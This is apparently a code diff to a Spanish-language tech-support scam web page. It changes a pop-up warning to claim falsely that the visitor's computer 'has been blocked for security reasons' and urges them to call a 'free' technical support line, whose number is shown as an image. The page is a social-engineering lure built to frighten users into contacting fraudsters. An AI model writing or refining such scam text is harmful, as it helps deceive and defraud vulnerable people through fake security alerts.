@@ -617,15 +617,18 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                     <div id="isp"></script></div>
                   </span>
     </div>
-    <img src="re.gif" id="banner">
+
     <div id="disclaimer">
-        Su PC puede ser vulnerable a virus y amenazas.<br>
+        El acceso a este ordenador ha sido bloqueado por razones de seguridad.<br>
         
 
-        <span class="support" style="font-size:22px;">Llame al número gratuito de soporte técnico:&nbsp; 
+        <span class="support" style="font-size:22px;">Póngase en contacto con el soporte técnico:&nbsp; 
         <img src="phone1.png"style="width: 200px;" id="banner">
         <!--<span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script> -->
-        </span>
+        
+	(Línea gratuita)
+	<br /><span style="color: green">SOPORTE 100% GRATUITO</span>
+	</span>
       </span>
 
             
